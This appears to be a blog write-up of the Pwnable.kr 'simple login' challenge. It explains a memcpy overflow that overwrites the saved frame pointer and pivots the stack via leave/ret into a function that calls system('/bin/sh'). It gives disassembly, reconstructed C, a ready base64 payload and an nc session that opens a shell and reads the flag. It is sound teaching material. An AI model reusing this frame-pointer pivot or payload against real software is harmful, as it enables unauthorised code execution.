---
title: Simple login - Pwnable.kr
date: 2017-01-19
categories: [Writeups, Pwnable.kr]
tags: ['Buffer overflow', 'EBP']
image:
    path: "/unsorted/pwnablekr.png"
---

Fuzzing a little bit we can easily crash the program...there is something
weird happening here.

```console
$ ./login 
Authenticate : aaaaaaaaaaaaa
hash : 0df08ae957b3d5ae2d6445c9416fe1cd
Segmentation fault (core dumped)
```


Analyzing a little bit we can realize that the program crashes at the address
`0x08049424`:

```nasm
 ,=< 0x0804940a      7513           jne 0x804941f   
 |   0x0804940c      e84efeffff     call sym.correct        
,==< 0x08049411      eb0c           jmp 0x804941f  
||   0x08049413      c70424baa60d.  mov dword [esp], str.Wrong_Length
||   0x0804941a      e8b12e0100     call sym.puts                                            
``-> 0x0804941f      b800000000     mov eax, 0                                                              
     0x08049424      c9             leave        ; <== The program crashes here
     0x08049425      c3             ret    
```

The instruction `leave` is an alias of `mov esp, ebp; pop ebp`, if we have a closer
look to the value of the register `ebp` before this instruction we can assume this
is the cause of the program crashing (together with the part `pop ebp` of the instruction
`leave`).

After that it should be fairly easy to find where the value of `ebp` is changing, for this
we can just [set some watchpoint](http://stackoverflow.com/questions/2223425/gdb-breakpoint-when-register-will-have-value-0xffaa).


```nasm
/ (fcn) sym.auth 113                                               
|           ; var int buff @ ebp-0x14                                                  
|           ; var int md5 @ ebp-0xc                                                            
|           ; arg int length @ ebp+0x8                                                         
|           ; arg int fun_arg_2 @ esp+0x4                                                      
|           ; arg int fun_arg_3 @ esp+0x8                                                  
|           ; CALL XREF from 0x08049402 (sym.main)                                   
|           0x0804929c      55             push ebp                                         
|           0x0804929d      89e5           mov ebp, esp                                       
|           0x0804929f      83ec28         sub esp, 0x28                                               
|           0x080492a2      8b4508         mov eax, dword [ebp + length] 
|           0x080492a5      89442408       mov dword [esp + fun_arg_3], eax                            
|           0x080492a9      c744240440eb.  mov dword [esp + fun_arg_2], obj.input
|           0x080492b1      8d45ec         lea eax, [ebp - buff]   
|           0x080492b4      83c00c         add eax, 0xc                                                
|           0x080492b7      890424         mov dword [esp], eax                                        
|           0x080492ba      e8a1030200     call sym.memcpy         
```


We notice that the function `memcpy` is overwriting the stored value of `ebp`, indeed
it is copying the content referenced by `obj.input` into a data segment
starting from the address `buff + 0xc`, i.e. `ebp - 0x14 + 0xc` which is `ebp-0x8`.
If the value of length is more than eight we can overwrite `ebp` and maybe the 
return address. Let's see where the value of length is coming from:


```c
int auth(int length){

        char copy[8]; // ebp - 0x8
        char* md5;    // ebp - 0xc
        char buff[8]; // ebp - 0x14

        memcpy( copy, input, length); // copy == buff + 0xc
        md5 = calc_md5(buff, 0xc);

        printf("hash: %s\n",md5); 

        return strcmp("f87cd601aa7fedca99018a8be88eda34",md5) == 0;

}

void main(){

    char buff[0x1e]; 
    memset(buff, 0, 0x1e);

    setvbuf(stdout, NULL, _IOFBF, 0); 
    setvbuf(stdin, NULL, _IOLBF, 0);

    printf("Authenticate :\n");
    scanf("%30s", buff);
    
    memset(input, 0, 0xc);

    char* decoded_buff = NULL;
    int length = base64Decode(buff, &decoded_buff); // length decoded buff

    if ( 0xc < length){
        puts("Wrong length");
        return;
    }

    memcpy(input, decoded_buff, length);
    
    if (auth(length) != 1) return;

    correct();
}
```
       
       
Damn, `length` cannot be bigger than `0xc`...it's ok, we can still control
the frame pointer. After we set the value of `ebp` we can use the instructions
`leave; ret` at the end of the function `main` to jump to the function `correct`.

Thanks to `leave` (i.e. `mov esp, ebp`) we can control the value of `esp`, next
the instruction `ret` (i.e. `jump [esp]`) will let us jump to the address pointed
by `esp`.

So, first of all lets choose an address where to jump...let's say `0x08049278`
(so we can avoid the test).


```nasm
/ (fcn) sym.correct 61                                                                          
|           ; var int local_ch @ ebp-0xc                                                             
|           ; CALL XREF from 0x0804940c (sym.main)                                                     
|           0x0804925f      55             push ebp                                             
|           0x08049260      89e5           mov ebp, esp                                                     
|           0x08049262      83ec28         sub esp, 0x28                                                    
|           0x08049265      c745f440eb11.  mov dword [ebp - local_ch], obj.input                            
|           0x0804926c      8b45f4         mov eax, dword [ebp - local_ch]                                  
|           0x0804926f      8b00           mov eax, dword [eax]                                             
|           0x08049271      3defbeadde     cmp eax, 0xdeadbeef                                             
|       ,=< 0x08049276      7518           jne 0x8049290             
|       |   0x08049278      c7042451a60d.  mov dword [esp], 0x80da651 
|       |   0x0804927f      e84c300100     call sym.puts                                             
|       |   0x08049284      c704246fa60d.  mov dword [esp], 0x80da66f ; "/bin/sh"
|       |   0x0804928b      e820200100     call sym.system                                           
|       `-> 0x08049290      c70424000000.  mov dword [esp], 0                                               
\           0x08049297      e804140100     call sym.exit              
```

Now we need to find a zone in memory where we can find the value `0x080492978`.
For this we can use the zone over which we have complete control. There are
several buffers used to store user data and even with ALSR as we are in little 
endian we could just overwrite the lower bits of the `ebp` with the right offset
in order to reference any data on the stack. But there is an easier solution,
we can use `obj.input` which fixed address is `0x0811eb40`.


```python
>>> base64.b64encode(bytes.fromhex('00000000 78920408 40eb1108'))
b'AAAAAHiSBAhA6xEI'
```

And then:   
  
```console
$ nc pwnable.kr 9003
Authenticate : AAAAAHiSBAhA6xEI
hash : 1528d0b5bb646c5820b04126329c2c70
Congratulation! you are good!
cat flag
control EBP, control ESP, ******* EIP, ******* *** *****~
```
       
       


